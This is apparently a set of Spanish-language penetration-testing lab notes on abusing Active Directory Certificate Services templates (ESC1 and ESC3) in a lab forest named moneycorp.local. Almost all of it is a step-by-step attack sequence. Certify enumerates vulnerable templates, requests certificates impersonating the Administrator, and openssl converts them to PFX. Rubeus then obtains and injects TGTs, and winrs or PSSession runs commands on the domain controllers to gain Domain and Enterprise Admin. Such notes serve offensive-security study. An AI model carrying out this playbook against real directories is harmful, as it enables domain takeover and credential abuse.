# Vulnerabilidades ESC 

Tags: #AD #ESC 

## Certify

* [Certify](https://github.com/GhostPack/Certify)

```powershell
! Usuario: Usuario de dominio

❯ Certify.exe cas
# Enumerar las Certificate Authorities (CAs) de AD CS en el bosque — muestra CAs enterprise, sus configuraciones y permisos.
```

```powershell 
❯ Certify.exe find
❯ Certify.exe find /domain:domain.corp /ldapserver:dc.domain.corp 
# Enumerar todas las plantillas de certificados disponibles en el bosque.


	# Obtenemos:
	CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : SmartCardEnrollment-Agent
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificates-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag                 : AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Certificate Request Agent
    mspki-certificate-application-policy  : Certificate Request Agent
    Permissions
      Enrollment Permissions   !IMPORTANTE      
        Enrollment Rights           : dcorp\Domain Users                S-1-5-21-719815819-3726368948-3917688648-513           !IMPORTANTE
[snip]

    Template Name                         : HTTPSCertificates    !IMPORTANTE
    Schema Version                        : 2
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificates-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT

```

```powershell 
❯ Certify.exe find /vulnerable
# Enumerar plantillas de certificados con configuraciones vulnerables — identifica candidatas para ataques ESC1-ESC8
```


---


## ESC 1

```powershell
! Usuario: Usuario de dominio con permisos de enrollment en la CA

Paso 1:
❯ C:\AD\Tools\Certify.exe find /enrolleeSuppliesSubject
# Enumerar plantillas donde el solicitante puede especificar el Subject Alternative Name (SAN) — identifica plantillas vulnerables a ESC1.


	# Obtenemos:
	CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : HTTPSCertificates     !IMPORTANTE
    Schema Version                        : 2
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificates-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions        
        Enrollment Rights           : dcorp\RDPUsers                S-1-5-21-719815819-3726368948-3917688648-1123     !IMPORTANTE
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
```

La plantilla "HTTPSCertificates" tiene:
- msPKI-Certificates-Name-Flag = `ENROLLEE_SUPPLIES_SUBJECT`
- pkiextendedkeyusage = Client Authentication 
- Enrollment Rights = dcorp\RDPUsers, mcorp\Domain Admins, mcorp\Enterprise Admins

### Escalación a DA

```powershell 
! Usuario: Usuario de dominio con permisos de enrollment en la CA

Paso 2 (Abusar de la forma 1):
# Apunta al administrador del dominio actual -> Escalada DA (Domain Admin)
# Solicitar un certificado especificando al Administrator como SAN — abusa de ENROLLEE_SUPPLIES_SUBJECT (ESC1) para obtener un certificado válido como DA/EA
❯ C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:administrator /sid:S-1-5-21-719815819-3726368948-3917688648-500
	# ca = CA (Certificate Authority) a la que se enviará la solicitud
	# template = Plantilla de certificado que se utilizará para emitir el certificado
	# altname = Subject Alternative Name (SAN). Identidad que queremos que aparezca dentro del certificado
	# sid = Object SID que se incluirá en el certificado del administrador que viene del 'dcorp\RDPUsers' del paso 1 (Pero le quitamos el 1123 y colocamos el 500)

Paso 3 (Abusar de la forma 1): 
❯ C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc1.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc1-DA.pfx
	# esc1.pem = Es el certificado obtenido: `-----BEGIN RSA PRIVATE KEY-----` y `-----END CERTIFICATE-----` del comando anterior (IMPORTANTE)
	# Solocar la password = SecretPass@123
	# esc1.pfx = Es el resultado del comando (IMPORTANTE)

Paso 4 (Abusar de la forma 1):
❯ C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:administrator /certificate:C:\AD\Tools\esc1-DA.pfx /password:SecretPass@123 /ptt
# Solicitar un TGT del Administrator usando el certificado ESC1 obtenido e inyectarlo en la sesión actual — completa la escalada a DA vía ESC1.

❯ klist   # Mirar los tickets de la sesión 

Paso 4 (Abusar de la forma 1):
❯ winrs -r:dcorp-dc cmd /c set username   # Ejecutar el comando 'set username' remotamente 
```

### Escalación a EA 

```powershell 
! Usuario: Usuario de dominio con permisos de enrollment en la CA

Paso 2 (Abusar de la forma 2): 
# Apunta al administrador del dominio 'padre' -> Escalada EA (Enterprise Admin)
❯ C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:moneycorp.local\administrator /sid:S-1-5-21-335606122-960912869-3279953914-500
	# ca = CA (Certificate Authority) a la que se enviará la solicitud
	# template = Plantilla de certificado que se utilizará para emitir el certificado
	# altname = Subject Alternative Name (SAN). Identidad que queremos que aparezca dentro del certificado
	# sid = Object SID que se incluirá en el certificado del administrador que viene del 'mcorp\Enterprise Admins' del paso 1 (Pero le quitamos el 519 y colocamos el 500)

Paso 3 (Abusar de la forma 2): 
❯ C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc1-EA.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc1-EA.pfx
	# esc1-EA.pem = Es el certificado obtenido: `-----BEGIN RSA PRIVATE KEY-----` y `-----END CERTIFICATE-----` del comando anterior (IMPORTANTE)
	# Solocar la password = SecretPass@123
	# esc1-EA.pfx = Es el resultado del comando (IMPORTANTE)

Paso 4 (Abusar de la forma 2): 
❯ C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:moneycorp.local\Administrator /dc:mcorp-dc.moneycorp.local /certificate:C:\AD\Tools\esc1-EA.pfx /password:SecretPass@123 /ptt
# Solicitar un TGT del Administrator usando el certificado ESC1 obtenido e inyectarlo en la sesión actual — completa la escalada a EA vía ESC1.

❯ klist   # Mirar los tickets de la sesión 

Paso 5 (Abusar de la forma 2): 
❯ winrs -r:mcorp-dc cmd /c set username   # Ejecutar el comando 'set username' remotamente 
```


--- 


## ESC 3 

- El template **"SmartCardEnrollment-Agent"** permite a los usuarios del dominio inscribirse (_enroll_) y cuenta con el EKU **"Certificate Request Agent"**.

```powershell 
! Usuario: Usuario de dominio

Paso 1:
❯ Certify.exe find /vulnerable
# Enumerar plantillas de certificados con configuraciones vulnerables


	# Obtenemos 
	CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : SmartCardEnrollment-Agent     !IMPORTANTE
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificates-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag                 : AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Certificate Request Agent      !IMPORTANTE
    mspki-certificate-application-policy  : Certificate Request Agent
    Permissions
      Enrollment Permissions
        Enrollment Rights           : dcorp\Domain Users            S-1-5-21-335606122-960912869-3279953914-513   !IMPORTANTE
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519

---------

EKU: 
- Client Authentication        ->      Autenticarse como usuario/equipo
- Server Authentication        ->      TLS de servidores
- Smart Card Logon             ->      Inicio de sesión con smart card 
- Certificate Request Agent    ->      Solicitar certificados en nombre de otros 
- Secure Email                 ->      S/MIME
```

- El template **"SmartCardEnrollment-Users"** tiene un requisito de emisión (_Application Policy Issuance Requirement_) de **Certificate Request Agent** y además cuenta con un **EKU (Extended Key Usage)** que indica **para qué puede usarse un certificado**

```powershell 
! Usuario: Usuario de dominio

Paso 1.1:
❯ C:\AD\Tools> C:\AD\Tools\Certify.exe find


	# Obtenemos:
		CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
	    Template Name                         : SmartCardEnrollment-Users   !IMPORTANTE
	    Schema Version                        : 2
	    Validity Period                       : 10 years
	    Renewal Period                        : 6 weeks
	    msPKI-Certificates-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
	    mspki-enrollment-flag                 : AUTO_ENROLLMENT
	    Authorized Signatures Required        : 1
	    Application Policies                  : Certificate Request Agent   !IMPORTANTE
	    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
	    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
	    Permissions
	      Enrollment Permissions
	        Enrollment Rights           : dcorp\Domain Users            S-1-5-21-719815819-3726368948-3917688648-513    !IMPORTANTE
	                                      mcorp\Domain Admins           S-1-5-21-719815819-3726368948-3917688648-512
	                                      mcorp\Enterprise Admins       S-1-5-21-719815819-3726368948-3917688648-519
```

### Escalación a DA

```powershell 
! Usuario: Usuario de dominio con permisos de enrollment en la CA

Paso 2 (Abusar de la forma 1):
❯ C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Agent
# Solicitar un certificado de Certificate Request Agent usando la plantilla SmartCardEnrollment-Agent — permite solicitar certificados en nombre de otros usuarios (ESC3).

Paso 3 (Abusar de la forma 1):
❯ C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc3.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc3-agent.pfx
	# esc3.pem = Es el certificado obtenido: `-----BEGIN RSA PRIVATE KEY-----` y `-----END CERTIFICATE-----` del comando anterior (IMPORTANTE)
	# Colocar la password = Password123
	# esc3-agent.pfx = Es el resultado del comando (IMPORTANTE)

Paso 4 (Abusar de la forma 1):
❯ C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:dcorp\administrator /enrollcert:C:\AD\Tools\esc3-agent.pfx /enrollcertpw:Password123
# Usar el certificado de agente (.pfx) para solicitar un certificado en nombre del Administrator usando la plantilla SmartCardEnrollment-Users — convierte cert.pem a .pfx antes de ejecutar

Paso 5 (Abusar de la forma 1):
❯ C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc3-DA.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc3-DA.pfx
	# esc3-DA.pem = Es el certificado obtenido: `-----BEGIN RSA PRIVATE KEY-----` y `-----END CERTIFICATE-----` del comando anterior (IMPORTANTE)
	# Solocar la password = Password123
	# esc3-DA.pfx = Es el resultado del comando (IMPORTANTE)

Paso 6 (Abusar de la forma 1):
Rubeus.exe -args asktgt /user:administrator /certificate:C:\AD\Tools\esc3-DA.pfx /password:Password123 /domain:domain.corp /ptt

❯ C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:administrator /certificate:C:\AD\Tools\esc3-DA.pfx /password:Password123 /domain:domain.corp /ptt
# Solicitar un TGT del Administrator usando el certificado obtenido e inyectarlo en la sesión actual — completa la escalada a DA vía ESC3

Paso 7 (Abusar de la forma 1):
❯ Enter-PSSession -ComputerName dc.domain.corp 
❯ winrs -r:dcorp-dc cmd /c set username
```

### Escalación a EA

```powershell 
! Usuario: Usuario de dominio con certificado de agente (esc3agent.pfx)

Paso 2 (Abusar de la forma 2):
❯ C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Agent
# Solicitar un certificado de Certificate Request Agent usando la plantilla SmartCardEnrollment-Agent — permite solicitar certificados en nombre de otros usuarios (ESC3).

Paso 3 (Abusar de la forma 2):
❯ C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc3.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc3-agent.pfx
	# esc3.pem = Es el certificado obtenido: `-----BEGIN RSA PRIVATE KEY-----` y `-----END CERTIFICATE-----` del comando anterior (IMPORTANTE)
	# Solocar la password = Password123
	# esc3-agent.pfx = Es el resultado del comando (IMPORTANTE)

Paso 4 (Abusar de la forma 2):
❯ C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:mcorp\administrator /enrollcert:C:\AD\Tools\esc3-agent.pfx /enrollcertpw:Password123
# Usar el certificado de agente para solicitar un certificado en nombre del Administrator del dominio padre (moneycorp.local) — escalada a Enterprise Admin vía ESC3.

Paso 5 (Abusar de la forma 2):
❯ C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc3-EA.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc3-EA.pfx
	# esc3-EA.pem = Es el certificado obtenido: `-----BEGIN RSA PRIVATE KEY-----` y `-----END CERTIFICATE-----` del comando anterior (IMPORTANTE)
	# Solocar la password = Password123
	# esc3-EA.pfx = Es el resultado del comando (IMPORTANTE)

Paso 6 (Abusar de la forma 2):
❯ .\Rubeus.exe asktgt /user:moneycorp.local\administrator /certificate:C:\AD\Tools\esc3-EA.pfx /domain:moneycorp.local /dc:mcorp-dc.moneycorp.local /password:Password123 /ptt

❯ C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:moneycorp.local\administrator /certificate:C:\AD\Tools\esc3-EA.pfx /domain:moneycorp.local /dc:mcorp-dc.moneycorp.local /password:Password123 /ptt
# Solicitar un TGT del Administrator del dominio padre usando el certificado obtenido e inyectarlo en la sesión actual — completa la escalada a EA vía ESC3

Paso 7 (Abusar de la forma 2):
❯ Enter-PSSession -ComputerName father-dc.domain.corp  
❯ winrs -r:mcorp-dc cmd /c set username
```